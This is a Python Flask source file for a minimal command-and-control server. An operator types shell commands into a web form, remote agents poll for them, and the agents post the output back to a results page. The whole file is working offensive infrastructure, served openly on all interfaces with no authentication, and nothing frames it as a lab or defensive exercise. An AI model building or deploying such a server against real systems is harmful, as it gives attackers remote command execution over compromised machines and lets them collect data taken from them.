from flask import Flask, request, jsonify, render_template_string
import datetime

app = Flask(__name__)

state = {
    "command": None,
    "result": None,
    "acknowledged": False,
}

def log(msg):
    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {msg}")

@app.route('/')
def index():
    return render_template_string('''
        <h2>Command & Control</h2>
        <form method="post" action="/set_command">
            <input name="command" style="width:300px" placeholder="Enter command">
            <button type="submit">Send</button>
        </form>
        <p><b>Last Command:</b> {{ command }}</p>
        <p><b>Status:</b> {% if acknowledged %}✅ Command executed{% else %}⏳ Waiting for agent...{% endif %}</p>
        <p><b>Latest Result:</b><br><pre>{{ result }}</pre></p>
    ''', command=state["command"], acknowledged=state["acknowledged"], result=state["result"])

@app.route('/set_command', methods=['POST'])
def set_command():
    cmd = request.form.get('command')
    state["command"] = cmd
    state["result"] = None
    state["acknowledged"] = False
    log(f"[SET] Command set to: {cmd}")
    return f"Command set to: {cmd}"

@app.route('/get_command', methods=['GET'])
def get_command():
    if not state["acknowledged"] and state["command"]:
        log(f"[GET] Agent pulled command: {state['command']}")
        return state["command"]
    log("[GET] Agent polled but no command available")
    return "none"

@app.route('/post_result', methods=['POST'])
def post_result():
    data = request.get_json()
    result = data.get('result', '').strip()
    if result:
        state["result"] = result
        state["acknowledged"] = True
        log(f"[POST] Agent sent result:\n{result}")
        state["command"] = None
    else:
        log("[POST] Agent sent empty result")
    return "Result received", 200

if __name__ == '__main__':
    log("Starting Flask Command & Control Server...")
    app.run(host='0.0.0.0', port=5001)
